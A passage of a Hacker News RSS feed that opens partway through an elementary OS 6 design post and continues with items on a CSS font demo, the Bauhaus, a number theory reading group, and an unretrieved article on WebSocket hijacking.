<p>We’ve long had plans to modernize the Granite Avatar widget. A continual problem we’ve faced is that many people just don’t set an avatar for their user account. As a consequence, we need a more meaningful fallback design that allows avatars to be distinct and useful in apps like Mail or in System Settings. As it turns out, the folks behind Handy had the same thoughts and the work was largely already done. <a rel="nofollow noopener noreferrer" target="_blank" href="https://github.com/exalm">Alexander Mikhaylenko</a> was very helpful and gracious in implementing changes in Handy to achieve the exact style we wanted, and I’m happy to say that we now have much more colorful interfaces in elementary OS 6 thanks to Handy Avatar, even if people don’t set avatar images.</p>

<figure>
  <picture>
    <source srcset="https://blog.elementary.io/images/look-and-feel-changes-coming-elementary-os-6/mail-dark.png" media="(prefers-color-scheme: dark)">
    <img alt="Mail 2.0" src="https://blog.elementary.io/images/look-and-feel-changes-coming-elementary-os-6/mail-light.png" width="1280" height="831">
  </picture>
<figcaption>The new Mail 2.0 using Handy Avatar</figcaption>
</figure>

<p>The other obvious change is more rounded bottom window corners. This seems like something that would be simple, but is actually not possible in vanilla GTK3. In elementary OS 5, we used clever workarounds for specific cases to give dialogs and other flat windows rounded corners all the way around. But in elementary OS 6, we can now have rounded bottom corners even in complex cases like Camera, thanks to Hdy.Window. It’s a small thing, but it definitely makes the whole UI feel just a bit more polished.</p>

<figure>
  <picture>
    <source srcset="https://blog.elementary.io/images/look-and-feel-changes-coming-elementary-os-6/camera-dark.png" media="(prefers-color-scheme: dark)">
    <img alt="Camera" src="https://blog.elementary.io/images/look-and-feel-changes-coming-elementary-os-6/camera-light.png" width="683" height="575">
  </picture>
<figcaption>Hey, it's me! But more importantly, the bottom corners are rounded here</figcaption>
</figure>

<h2 id="typography">Typography</h2>

<p>The default typefaces in elementary OS have also been changed for the first time since our initial brand work. Instead of Open Sans with Raleway for headers, we’ve unified on <a rel="nofollow noopener noreferrer" target="_blank" href="https://rsms.me/inter/">Inter</a>: a new, modern typeface specifically designed for use in user interfaces on computer screens. The designer, Rasmus Andersson, actively updates Inter and has been very responsive on GitHub. He’s even weighed in on our use of Inter in elementary OS, and his feedback has led to changes in the weights we use for various headers.</p>

<figure>
  <picture>
    <source srcset="https://blog.elementary.io/images/look-and-feel-changes-coming-elementary-os-6/granite-welcome-dark.png" media="(prefers-color-scheme: dark)">
    <img alt="Granite Welcome" src="https://blog.elementary.io/images/look-and-feel-changes-coming-elementary-os-6/granite-welcome.png" width="882" height="693">
  </picture>
<figcaption>Inter being used on Granite Demo's welcome screen</figcaption>
</figure>

<p>We’ve also revisited the default font rendering settings, opting for grayscale anti-aliasing over RGB; this addresses some issues we’ve seen with ghosting/leaking of colors around text, especially visible when using transparency. You’ll find that in general, text is bolder, higher contrast, and more legible in elementary OS 6.</p>

<h2 id="iconography">Iconography</h2>

<p>The visual style for our icons has remained largely unchanged, with more focus put on internal consistency. You’ll notice subtle improvements such as a more consistent use of our color palette, plus more gender-neutral depictions of a “user” in places like System Settings.</p>

<figure>
  <picture>
    <img alt="User Accounts icon" src="https://blog.elementary.io/images/look-and-feel-changes-coming-elementary-os-6/system-users.svg" width="32" height="32">
  </picture>
<figcaption>New user accounts icon</figcaption>
</figure>

<p>A long outstanding issue has been wrangling all the different styles of arrows that we’ve used over the years. There are hundreds of arrow icons in the elementary icon set, used across many different contexts. We provide both full color and flat, symbolic icons and in a range of different sizes. There are even different kinds of arrow tails depending on context, or no tail at all. In elementary OS 6, we have one new shape to rule them all and we’ve given arrows more rounded corners.</p>

<figure>
  <picture>
    <img src="https://blog.elementary.io/images/look-and-feel-changes-coming-elementary-os-6/arrows.svg">
  </picture>
  <figcaption>A small portion of the new arrow icons</figcaption>
</figure>

<p>In arrows with curved tails, such as in Mail tool icons, the area under the curve is larger, making the shape more recognizeable at small sizes or for folks with less acute vision. We’ve also reduced busy overlap and improved separation in symbolic icons, which now match their full color counterparts much more closely.</p>

<figure>
  <picture>
    <img alt="Mail Reply Icon" src="https://blog.elementary.io/images/look-and-feel-changes-coming-elementary-os-6/mail-icons.svg">
  </picture>
  <figcaption>New Mail tool icons</figcaption>
</figure>

<p>We’re rounding out corners and using bolder shapes in other places as well. The new media controls icons for example feel much more weighty, and the lightning bolt symbol used on power icons is more distinct. Historically, going into more detail hasn’t been as important on LoDPI displays, but the new shapes really shine on displays with more pixels available.</p>

<figure>
  <picture>
    <img src="https://blog.elementary.io/images/look-and-feel-changes-coming-elementary-os-6/power-media-icons.svg">
  </picture>
  <figcaption>New power and media controls icons</figcaption>
</figure>

<h2 id="stylesheet">Stylesheet</h2>

<p>One recurring bit of feedback that we’ve received is that in general, the stylesheet in elementary OS 5 is somewhat low contrast. Low contrast can make it hard to read text for visually impaired users, but it can also be a large problem on lower quality displays. Contrast between widgets and their backgrounds can also help clearly define different parts of an application, and especially which of those parts are interactive. Addressing these concerns is part of our larger project to make elementary OS 6 more accessible by default, which we’ve written about previously.</p>



<p>To ensure we achieve the desired contrast, we created a design system built on UI levels. With a little bit of Sass magic, we can style widgets by picking a background level—such as 0 for inputs or 4 for toolbars—and then overlaying a white gradient and adding a shadow—which also comes in various levels. The overall result is a style that is a bit flatter on the surface of each layer, but overall more consistent in its use of depth, and with much more consistent and expressive use of shadows between layers.</p>

<figure>
  <picture>
    <source srcset="https://blog.elementary.io/images/look-and-feel-changes-coming-elementary-os-6/files-dark.png" media="(prefers-color-scheme: dark)">
    <img alt="Granite Welcome" src="https://blog.elementary.io/images/look-and-feel-changes-coming-elementary-os-6/files-light.png" width="916" height="655">
  </picture>
<figcaption>Files with different levels as shown in inputs, sidebars, tabbars, actionbars, and headerbars</figcaption>
</figure>

<p>Another place for more clear differentiation is in widget states. Interfaces are interactive: they can be selected, disabled, focused, or pressed. We started some work towards more clearly differentiated states in elementary OS 5 when we redesigned checkboxes, and in elementary OS 6 this work has extended to other interactive widgets like text entries and buttons. Disabled widgets, for example, are much more obviously darker than the default UI level, and are intentionally lower contrast than enabled widgets.</p>

<figure>
  <picture>
    <source srcset="https://blog.elementary.io/images/look-and-feel-changes-coming-elementary-os-6/widget-factory-dark.png" media="(prefers-color-scheme: dark)">
    <img alt="GTK Widget Factory" src="https://blog.elementary.io/images/look-and-feel-changes-coming-elementary-os-6/widget-factory-light.png" width="1283" height="778">
  </picture>
<figcaption>The GTK Widget Factory demoing possible states of widgets</figcaption>
</figure>

<p>Something we knew we needed to consider from very early on was a path towards making elementary OS feel more personal without breaking custom styles in apps. We know that many of our users are currently using custom CSS, but that it often leads to breakage and disappointment. In elementary OS 6, we provide 10 possible accent colors to choose from. Combined with the dark style, you can get a much more unique look for your operating system without having to worry about apps behaving incorrectly. The dark style follows all the same principles as outlined above including UI levels, using higher contrast, etc. And we’re still exploring more ways to expose your chosen accent color in ways that feel fun and personal.</p>

<figure>
  <p><img src="https://blog.elementary.io/images/look-and-feel-changes-coming-elementary-os-6/accent-pink.png" alt="Light &amp; Pink">
<img src="https://blog.elementary.io/images/look-and-feel-changes-coming-elementary-os-6/accent-green.png" alt="Dark &amp; Green"></p>
  <figcaption>
    <p><strong>Left:</strong> A light desktop with the Bubblegum accent color | <strong>Right:</strong> A dark desktop with the Lime accent color</p>
  </figcaption>
</figure>

<p>Focus styles are still a work in progress, but the goal here is to make much more bold use of color and to make the keyboard focus location much more obvious. We’ve also revisited selected states and suggested action button styles to make sure that we’re clearly differentiating between someone’s strawberry accent color and destructive action buttons. Instead of using white text on a colored background, we now use a much subtler style that is ultimately higher contrast as well. It also works much better for accent colors, custom brand colors in apps, or other places where we want to use color such as Calendar events.</p>

<figure>
  <picture>
    <source srcset="https://blog.elementary.io/images/look-and-feel-changes-coming-elementary-os-6/suggested-action-dark.png" media="(prefers-color-scheme: dark)">
    <img alt="Suggested Action Dialog" src="https://blog.elementary.io/images/look-and-feel-changes-coming-elementary-os-6/suggested-acton-light.png" width="549" height="301">
  </picture>
  <picture>
    <source srcset="https://blog.elementary.io/images/look-and-feel-changes-coming-elementary-os-6/destructive-action-dark.png" media="(prefers-color-scheme: dark)">
    <img alt="Destructive Action Dialog" src="https://blog.elementary.io/images/look-and-feel-changes-coming-elementary-os-6/destructive-action-light.png" width="549" height="301">
  </picture>
  <figcaption>
    <p><strong>Left:</strong> A dialog with a suggested action | <strong>Right:</strong> A dialog with a destructive action</p>
  </figcaption>
</figure>

<p>We also hear regularly from users who have displays that sit in that uncomfortable zone between 1× and 2× UI scaling. While we’re still not offering traditional fractional scaling in elementary OS, we have been working on an improved scalable UI solution. In elementary OS 5, people who opted to change the default text size were left with an awkwardly spaced UI with large text, but small controls. In elementary OS 6, we now scale default widgets spacing, corner radii, etc. with text size, eliminating a lot of that awkwardness. It’s not quite perfect, but it will make elementary OS much more legible for more people without incurring the performance penalty associated with traditional fractional scaling. And we’re happy to have a more first-class experience for those who need larger text.</p>

<figure>
  <picture>
    <source srcset="https://blog.elementary.io/images/look-and-feel-changes-coming-elementary-os-6/scale-default-dark.png" media="(prefers-color-scheme: dark)">
    <img alt="Default Scale" src="https://blog.elementary.io/images/look-and-feel-changes-coming-elementary-os-6/scale-default-light.png" width="376" height="285">
  </picture>
  <picture>
    <source srcset="https://blog.elementary.io/images/look-and-feel-changes-coming-elementary-os-6/scale-larger-dark.png" media="(prefers-color-scheme: dark)">
    <img alt="Larger Scale" src="https://blog.elementary.io/images/look-and-feel-changes-coming-elementary-os-6/scale-larger-light.png" width="504" height="338">
  </picture>
  <figcaption>
    <p><strong>Left:</strong> A …</p></figcaption></figure></section></article></div>
<br/><p><em>Article truncated for RSS feed. Read the full article at <a href="https://blog.elementary.io/look-and-feel-changes-elementary-os-6/">https://blog.elementary.io/look-and-feel-changes-elementary-os-6/</a></em></p>]]>
            </description>
            <link>https://blog.elementary.io/look-and-feel-changes-elementary-os-6/</link>
            <guid isPermaLink="false">hacker-news-small-sites-26366795</guid>
            <pubDate>Sat, 06 Mar 2021 11:47:25 GMT</pubDate>
        </item>
        <item>
            <title>
<![CDATA[Cross-Site WebSocket Hijacking (Cswsh)]]>
            </title>
            <description>
<![CDATA[
Score 3 | Comments 0 (<a href="https://news.ycombinator.com/item?id=26366674">thread link</a>) | @seven
<br/>
March 6, 2021 | https://christian-schneider.net/CrossSiteWebSocketHijacking.html | <a href="https://web.archive.org/web/*/https://christian-schneider.net/CrossSiteWebSocketHijacking.html">archive.org</a>
<br/><!-- hnss:readable-content --><hr/>Unable to retrieve article]]>
            </description>
            <link>https://christian-schneider.net/CrossSiteWebSocketHijacking.html</link>
            <guid isPermaLink="false">hacker-news-small-sites-26366674</guid>
            <pubDate>Sat, 06 Mar 2021 11:17:19 GMT</pubDate>
        </item>
        <item>
            <title>
<![CDATA[CSS Border Font]]>
            </title>
            <description>
<![CDATA[
Score 4 | Comments 0 (<a href="https://news.ycombinator.com/item?id=26366583">thread link</a>) | @roosgit
<br/>
March 6, 2021 | https://davorsuljic.github.io/css-border-font.html | <a href="https://web.archive.org/web/*/https://davorsuljic.github.io/css-border-font.html">archive.org</a>
<br/><!-- hnss:readable-content --><hr/><div id="readability-page-1" class="page">
  		
  		<p>A Bauhaus inspired font, created with advantages and drawbacks that CSS gives us.</p>
	  	<p><span>A</span>
	  		<span>B</span>
			<span>C</span>
			<span>D</span>
			<span>E</span>
			<span>F</span>
			<span>G</span>
			<span>H</span>
			<span>I</span>
			<span>J</span>
			<span>K</span>
			<span>L</span>
			<span>M</span>
			<span>N</span>
			<span>O</span>
			<span>P</span>
			<span>Q</span>
			<span>R</span>
			<span>S</span>
			<span>T</span>
			<span>U</span>
			<span>V</span>
			<span>W</span>
			<span>X</span>
			<span>Y</span>
			<span>Z</span>
			<span>Æ</span>
			<span>Ø</span>
			<span>Å</span>
			<span></span>
			<span>a</span>
			<span>b</span>
			<span>c</span>
			<span>d</span>
			<span>e</span>
			<span>f</span>
			<span>g</span>
			<span>h</span>
			<span>i</span>
			<span>j</span>
			<span>k</span>
			<span>l</span>
			<span>m</span>
			<span>n</span>
			<span>o</span>
			<span>p</span>
			<span>q</span>
			<span>r</span>
			<span>s</span>
			<span>t</span>
			<span>u</span>
			<span>v</span>
			<span>w</span>
			<span>x</span>
			<span>y</span>
			<span>z</span>
			<span>æ</span>
			<span>ø</span>
			<span>å</span>
			<span></span>
			<span>1</span>
			<span>2</span>
			<span>3</span>
			<span>4</span>
			<span>5</span>
			<span>6</span>
			<span>7</span>
			<span>8</span>
			<span>9</span>
			<span>0</span>
		</p>
		<p><span>A</span>
	  		<span>B</span>
			<span>C</span>
			<span>D</span>
			<span>E</span>
			<span>F</span>
			<span>G</span>
			<span>H</span>
			<span>I</span>
			<span>J</span>
			<span>K</span>
			<span>L</span>
			<span>M</span>
			<span>N</span>
			<span>O</span>
			<span>P</span>
			<span>Q</span>
			<span>R</span>
			<span>S</span>
			<span>T</span>
			<span>U</span>
			<span>V</span>
			<span>W</span>
			<span>X</span>
			<span>Y</span>
			<span>Z</span>
			<span>Æ</span>
			<span>Ø</span>
			<span>Å</span>
			<span></span>
			<span>a</span>
			<span>b</span>
			<span>c</span>
			<span>d</span>
			<span>e</span>
			<span>f</span>
			<span>g</span>
			<span>h</span>
			<span>i</span>
			<span>j</span>
			<span>k</span>
			<span>l</span>
			<span>m</span>
			<span>n</span>
			<span>o</span>
			<span>p</span>
			<span>q</span>
			<span>r</span>
			<span>s</span>
			<span>t</span>
			<span>u</span>
			<span>v</span>
			<span>w</span>
			<span>x</span>
			<span>y</span>
			<span>z</span>
			<span>æ</span>
			<span>ø</span>
			<span>å</span>
			<span></span>
			<span>1</span>
			<span>2</span>
			<span>3</span>
			<span>4</span>
			<span>5</span>
			<span>6</span>
			<span>7</span>
			<span>8</span>
			<span>9</span>
			<span>0</span>
		</p>
		<p><span>A</span>
	  		<span>B</span>
			<span>C</span>
			<span>D</span>
			<span>E</span>
			<span>F</span>
			<span>G</span>
			<span>H</span>
			<span>I</span>
			<span>J</span>
			<span>K</span>
			<span>L</span>
			<span>M</span>
			<span>N</span>
			<span>O</span>
			<span>P</span>
			<span>Q</span>
			<span>R</span>
			<span>S</span>
			<span>T</span>
			<span>U</span>
			<span>V</span>
			<span>W</span>
			<span>X</span>
			<span>Y</span>
			<span>Z</span>
			<span>Æ</span>
			<span>Ø</span>
			<span>Å</span>
			<span></span>
			<span>a</span>
			<span>b</span>
			<span>c</span>
			<span>d</span>
			<span>e</span>
			<span>f</span>
			<span>g</span>
			<span>h</span>
			<span>i</span>
			<span>j</span>
			<span>k</span>
			<span>l</span>
			<span>m</span>
			<span>n</span>
			<span>o</span>
			<span>p</span>
			<span>q</span>
			<span>r</span>
			<span>s</span>
			<span>t</span>
			<span>u</span>
			<span>v</span>
			<span>w</span>
			<span>x</span>
			<span>y</span>
			<span>z</span>
			<span>æ</span>
			<span>ø</span>
			<span>å</span>
			<span></span>
			<span>1</span>
			<span>2</span>
			<span>3</span>
			<span>4</span>
			<span>5</span>
			<span>6</span>
			<span>7</span>
			<span>8</span>
			<span>9</span>
			<span>0</span>
		</p>
		<p><span>A</span>
	  		<span>B</span>
			<span>C</span>
			<span>D</span>
			<span>E</span>
			<span>F</span>
			<span>G</span>
			<span>H</span>
			<span>I</span>
			<span>J</span>
			<span>K</span>
			<span>L</span>
			<span>M</span>
			<span>N</span>
			<span>O</span>
			<span>P</span>
			<span>Q</span>
			<span>R</span>
			<span>S</span>
			<span>T</span>
			<span>U</span>
			<span>V</span>
			<span>W</span>
			<span>X</span>
			<span>Y</span>
			<span>Z</span>
			<span>Æ</span>
			<span>Ø</span>
			<span>Å</span>
			<span></span>
			<span>a</span>
			<span>b</span>
			<span>c</span>
			<span>d</span>
			<span>e</span>
			<span>f</span>
			<span>g</span>
			<span>h</span>
			<span>i</span>
			<span>j</span>
			<span>k</span>
			<span>l</span>
			<span>m</span>
			<span>n</span>
			<span>o</span>
			<span>p</span>
			<span>q</span>
			<span>r</span>
			<span>s</span>
			<span>t</span>
			<span>u</span>
			<span>v</span>
			<span>w</span>
			<span>x</span>
			<span>y</span>
			<span>z</span>
			<span>æ</span>
			<span>ø</span>
			<span>å</span>
			<span></span>
			<span>1</span>
			<span>2</span>
			<span>3</span>
			<span>4</span>
			<span>5</span>
			<span>6</span>
			<span>7</span>
			<span>8</span>
			<span>9</span>
			<span>0</span>
		</p>
		<p><span>A</span>
	  		<span>B</span>
			<span>C</span>
			<span>D</span>
			<span>E</span>
			<span>F</span>
			<span>G</span>
			<span>H</span>
			<span>I</span>
			<span>J</span>
			<span>K</span>
			<span>L</span>
			<span>M</span>
			<span>N</span>
			<span>O</span>
			<span>P</span>
			<span>Q</span>
			<span>R</span>
			<span>S</span>
			<span>T</span>
			<span>U</span>
			<span>V</span>
			<span>W</span>
			<span>X</span>
			<span>Y</span>
			<span>Z</span>
			<span>Æ</span>
			<span>Ø</span>
			<span>Å</span>
			<span></span>
			<span>a</span>
			<span>b</span>
			<span>c</span>
			<span>d</span>
			<span>e</span>
			<span>f</span>
			<span>g</span>
			<span>h</span>
			<span>i</span>
			<span>j</span>
			<span>k</span>
			<span>l</span>
			<span>m</span>
			<span>n</span>
			<span>o</span>
			<span>p</span>
			<span>q</span>
			<span>r</span>
			<span>s</span>
			<span>t</span>
			<span>u</span>
			<span>v</span>
			<span>w</span>
			<span>x</span>
			<span>y</span>
			<span>z</span>
			<span>æ</span>
			<span>ø</span>
			<span>å</span>
			<span></span>
			<span>1</span>
			<span>2</span>
			<span>3</span>
			<span>4</span>
			<span>5</span>
			<span>6</span>
			<span>7</span>
			<span>8</span>
			<span>9</span>
			<span>0</span>
		</p>
	

</div>]]>
            </description>
            <link>https://davorsuljic.github.io/css-border-font.html</link>
            <guid isPermaLink="false">hacker-news-small-sites-26366583</guid>
            <pubDate>Sat, 06 Mar 2021 10:50:00 GMT</pubDate>
        </item>
        <item>
            <title>
<![CDATA[Tech posers of the Bauhaus]]>
            </title>
            <description>
<![CDATA[
Score 81 | Comments 35 (<a href="https://news.ycombinator.com/item?id=26366513">thread link</a>) | @amicoleo
<br/>
March 6, 2021 | https://www.orgonomyproductions.info/notes/notes/2021/02/27/TechPosersBauhaus.html | <a href="https://web.archive.org/web/*/https://www.orgonomyproductions.info/notes/notes/2021/02/27/TechPosersBauhaus.html">archive.org</a>
<br/><!-- hnss:readable-content --><hr/><div id="readability-page-1" class="page"><div aria-label="Content">
      <div>
        




<article itemscope="" itemtype="https://schema.org/BlogPosting">

  


  <div itemprop="articleBody">
    <p>The Bauhaus greatest achievement was to make artists interested in the creative use of technology, to design things that are useful and nice to use. And they did that without knowing a lot about tech.</p>

<hr>

<p>Product, experience, interaction, industrial designers, creative technologists. If somehow you are a creative interested in making things that are useful and nice to use, you owe that to the Bauhaus. It’s also because of that school and their influence on art education that we can enjoy things designed by people with an artistic sensibility. Rather than only having things designed by engineers.</p>

<p>At the time, few artists were willing to collaborate with the industry to create mass-manufactured objects. Architect Walter Gropius, founder and director of the school, was especially passionate about social architecture and in general in creating things for the common people. Mass-manufacturing technology could allow that at scale. So some years after the creation of the school, he adjusted the focus in the Bauhaus curriculum. And since 1925, when the Bauhaus moved to Dessau, the school new motto became ‘Art and technology: a new unity’.</p>

<hr>

<p>But despite the ambition of the Bauhaus to teach students how to design for the industry, few of the tutors at the time had experience in industrial production. The school method was still based on a combination of applied arts and academic education, and the students’ practical lessons were given by craftsmen whose experience was in making things by hand and not in designing for production.</p>

<p>For instance, in the metal workshop under Moholy-Nagy, students would handmade prototypes with a style they thought would be easy to reproduce industrially. For instance using spheres, cylinders and other basic shapes. Except that due to their ignorance of industrial processes, those objects were hard to make in a mass-production facility.</p>

<p>But the strongest critique of the Bauhaus lack of technological knowledge was Buckminster Fuller. Fuller was familiar with the work of the Bauhaus due to the Black Mountain College in the US, where he and other former Bauhaus tutors were teaching. According to him, the ‘International Style’ brought to the US by the Bauhaus, simple replaced the previous decorative style with a new simplified one made of basic shapes and colours. A new exterior, but that was leaving unchanged the structural and functional elements of the building.</p>

<blockquote>
  <p>In short they only looked at problems of modifications of the surface of end-product, which end-products were inherently sub-functions of a technically obsolete world</p>
</blockquote>

<p>(Obviously, Bucky did all the things he was criticising Gropius and the Bauhaus about. But that’s a story I’ll save for some other time).</p>

<hr>

<p>The excitement of the Bauhauslers for new technologies is still present among designers now. And so is that limit in understanding fully a new innovation that can be used in a new product or service. I feel that every time I’m working with machine learning. But what the Bauhaus achieved was to get artists interested in bringing their sensibility in the creative use of technology. And whatever Bucky thinks, that remains.</p>

<p><strong>References</strong></p>

<p>Bauhaus - Madgalena Droste</p>

<p>Theory and Design in the First Machine Age - Reyner Banham</p>


  </div>

  
</article>



      </div>


    </div></div>]]>
            </description>
            <link>https://www.orgonomyproductions.info/notes/notes/2021/02/27/TechPosersBauhaus.html</link>
            <guid isPermaLink="false">hacker-news-small-sites-26366513</guid>
            <pubDate>Sat, 06 Mar 2021 10:29:24 GMT</pubDate>
        </item>
        <item>
            <title>
<![CDATA[Tell HN: I am doing online reading sessions on analytic number theory]]>
            </title>
            <description>
<![CDATA[
Score 99 | Comments 28 (<a href="https://news.ycombinator.com/item?id=26366464">thread link</a>) | @susam
<br/>
March 6, 2021 | https://spxy.github.io/bc/ | <a href="https://web.archive.org/web/*/https://spxy.github.io/bc/">archive.org</a>
<br/><!-- hnss:readable-content --><hr/><div id="readability-page-1" class="page"><div>


<p>
Welcome to the first edition of our online reading session. This is a
tiny book club. In the first edition, we will be diving into the
beautiful world of <em>number theory</em>.
</p>



<p>
  <small>
  †
  The Matrix room and Freenode channel are bridged together, so if you
  join one of them, you will automatically receive the updates and
  messages from the other one too. If you are not an active Freenode
  user, prefer joining the Matrix room because it is more convenient,
  e.g., you can close your browser or client and your chat session will
  still stay alive. You can connect back the next day and catch up with
  the messages. Doing that with Freenode IRC requires slightly more work
  (setting up IRC bouncers etc.).
  </small>
</p>


<h2 id="reference">Reference Material<a href="#reference"></a></h2>

<p>
The primary reference book for these meetings is going to be:
<em>Introduction to Analytic Number Theory</em> written by Tom M.
Apostol. Admittedly, the book is quite expensive but you may find a
relatively cheap paperback (softcover) copy on some websites. A DRM-free
PDF eBook is available for purchase at <a href="https://www.springer.com/gp/book/9780387901633">springer.com/gp/book/9780387901633</a>.
</p>

<p>
If you are unable to buy the reference book, you can still participate
in this book club activity by downloading freely available notes from
  the University of Illinois: <a href="https://faculty.math.illinois.edu/~hildebr/ant/main.pdf">main.pdf</a>.
</p>

<p>
For solutions to exercise problems, refer to this excellent PDF created
by Greg Hurst: <a href="https://greghurst.files.wordpress.com/2014/02/apostol_intro_to_ant.pdf">apostol_intro_to_ant.pdf</a>.
</p>


<h2 id="schedule">Schedule<a href="#schedule"></a></h2>

<p>
Here is the schedule for the upcoming planned meetings:
</p>

<ul>
  <li>
     04 Mar 2021 18:00-18:40 UTC: Introduction. Kick-starting chapter 1.
    (Pilot)
  </li>
  <li>
    05 Mar 2021 18:00-18:40 UTC: Chapter 1
  </li>
  <li>
    06 Mar 2021 10:00-10:40 UTC: Chapter 1
  </li>
  <li>
    07 Mar 2021 10:00-10:40 UTC: Chapter 1
  </li>
  <li>
    08 Mar 2021 18:00-18:40 UTC: Chapter 1
  </li>
  <li>
    09 Mar 2021 18:00-18:40 UTC: Chapter 1
  </li>
  <li>
    10 Mar 2021 18:00-18:40 UTC: Chapter 1
  </li>
  <li>
    More sessions coming up later ...
  </li>
</ul>

<p>
Roughly speaking, the plan is to cover a chapter every one or two weeks.
</p>

<p>
If you have any questions, join our <a href="https://app.element.io/#/room/#susam:matrix.org">Matrix room</a>
(or the corresponding Freenode channel) and discuss.
</p>

<p>
Also, <a href="https://twitter.com/intent/follow?screen_name=susam">follow me on
Twitter</a> where I will post upcoming reading session details.
</p>

<h2 id="faq">FAQ<a href="#faq"></a></h2>
<ol>
  <li id="faq-who">
    <h3>
      Who are you?
      <a href="#faq-who"></a>
    </h3>
    <p>
      Hi! I am <a href="https://susam.in/">Susam</a>. I am just someone
      who enjoys mathematics, Lisp, and Emacs and wants to spread the
      joy of spending time with these beautiful things. I have been
      working as an information security professional for about 15
      years. Of these 15 years, close to 7 years were spent working with
      probability theory, calculus, and combinatorics, and another 3
      years in implementation of cryptographic utilities.
    </p>
    <p>
      I do a lot of teaching as hobby. This is my way of giving
      something back to the technology community. I have taught Common
      Lisp, Emacs, Python, C, Vim, and various areas of mathematics. In
      each one of my previous workplaces, I have created communities
      around mathematics, algorithms, and/or, cryptography. In the
      online world, I created the <a href="https://webchat.freenode.net/##algorithms">##algorithms</a>
      channel on Freenode IRC (my nick there is <code>spal</code>). What
      started as a tiny hobby club around algorithms 13 years ago is now
      a thriving community with over 200 members. (Disclosure: I don't
      participate in it anymore but a highly talented group of
      moderators helps maintain the channel).
    </p>
    <p>
      These hobbies of teaching and forming local and online communities
      have also led me to write some open source projects. Some are
      mildly popular and some not so popular but have managed to find
      its own niche community of users. For example, <a href="https://github.com/susam/texme">TeXMe</a> and <a href="http://mathb.in/">MathB.in</a> were born out of the need to
      share mathematics problems and solutions within these communities.
      <a href="https://github.com/susam/uncap">Uncap</a> was born when I
      used to teach Vim and I wanted Windows users to have a good
      ergonomic experience. Similarly, <a href="https://github.com/susam/emacs4cl">Emacs4CL</a> was born
      while teaching Common Lisp with Emacs and SLIME.
    </p>
    <p>
      To summarize, I work in information security by profession and I
      am an open source software developer by hobby. I want to use some
      part of my leisure time in hosting book club meetings where we
      pick up good books and work through them together.
    </p>
  </li>
  <li id="faq-why">
    <h3>
      Why are you doing this?
      <a href="#faq-why"></a>
    </h3>
    <p>
      During the course of my career and hobbies, I have found
      Mathematics, Lisp, and Emacs to be extraordinarily elegant and
      beautiful and it is my goal to introduce as many people to these
      things as possible.
    </p>
    <p>
      Software development these days focus a lot around stitching
      together many libraries to accomplish complex tasks. I understand
      that this is more economical and productive. This approach has
      certainly made it possible to develop huge and complex
      software-based infrastructure that has changed the way we live.
      However, I think, in this fast-paced software development world,
      the simpler joys of devising or implementing algorithms from
      scratch and appreciating the underlying beauty of mathematics is
      taking a backseat. I intend to introduce more and more people to
      some of these simpler joys, especially, the joy of unravelling the
      mysteries of prime numbers, appreciating the simplicity and
      elegance of Lisp, experiencing the remarkable extensibility of
      Emacs, and so on.
    </p>
    <p>
      Also, the more I help others work though a formidable book like
      <em>Introduction to Analytic Number Theory</em>, the more it helps
      me too to appreciate some finer and deeper points that I may not
      have paid due attention to when I read the book for the first
      time. So I benefit from these reading sessions too. Similarly, the
      more I help someone with Common Lisp programming, the more I have
      to dive into the Common Lisp HyperSpec which often teaches me a
      few new things too, so I gain from the experience too.
    </p>
  </li>
  <li id="faq-book">
    <h3>
      Have you read the entire book?
      <a href="#faq-book"></a>
    </h3>
    <p>
      No, I have read approximately half of the book (Introduction to
      Analytic Number Theory) and I am enjoying it so far. This means
      that I am a good number of chapters ahead of someone who has just
      begun reading this book, so I can maintain a steady pace in the
      reading sessions and also be able to tell if some topics or areas
      of confusion in an earlier chapter will be clarified in a later
      chapter.
    </p>
  </li>
  <li id="faq-lisp">
    <h3>
      You mentioned Lisp. Can you do a book club for it?
      <a href="#faq-lisp"></a>
    </h3>
    <p>
      Yes, Lisp and Emacs are two other areas at the top of my mind.
      Once there has been sufficient progress in the number theory book
      club, I plan to start a Lisp one next. Join the <a href="https://app.element.io/#/room/#susam:matrix.org">Matrix
      room</a> or <a href="https://app.element.io/#/room/#susam:matrix.org">follow me
      on Twitter</a> to receive further updates about this.
    </p>
  </li>
  <li id="faq-but">
    <h3>
      But I want to do group reading sessions for another book!
      <a href="#faq-but"></a>
    </h3>
    <p>
      Start your own book club around it! This is mine. I have chosen
      number theory as the topic of discussion for now. After a few
      months, I will move on to topics around Lisp and Emacs. If you
      have a different topic or book in mind, start your own book club
      for it. You can reuse my channels (see top of this page) for it or
      you can do it your own way. If you let me know about it and if I
      can find the time, I will join your book club too! I think, we
      need more book clubs, not less!
    </p>
  </li>
  <li id="faq-recording">
    <h3>
      Will these sessions be recorded?
      <a href="#faq-recording"></a>
    </h3>
    <p>
      Not at this time because we often refer to a few pages of the book
      via screen sharing during the reading session. I don't know the
      copyright implications of recording such sessions as videos and
      sharing them with everyone online. If you have expertise in this
      area, I would like to know if my concern is genuine and if there
      is a way to resolve it.
    </p>
  </li>


</ol></div></div>]]>
            </description>
            <link>https://spxy.github.io/bc/</link>
            <guid isPermaLink="false">hacker-news-small-sites-26366464</guid>
            <pubDate>Sat, 06 Mar 2021 10:14:24 GMT</pubDate>
        </item>
        <item>
            <title>
<![CDATA[Thomas Edison's Hiring Test]]>
            </title>
            <description>
<![CDATA[
Score 3 | Comments 0 (<a href="https://news.ycombinator.com/item?id=26366056">thread link</a>) | @rsj_hn
<br/>
March 6, 2021 | https://www.thomasedison.org/thomas-edison-hiring-test | <a href="https://web.archive.org/web/*/https://www.thomasedison.org/thomas-edison-hiring-test">archive.org</a>
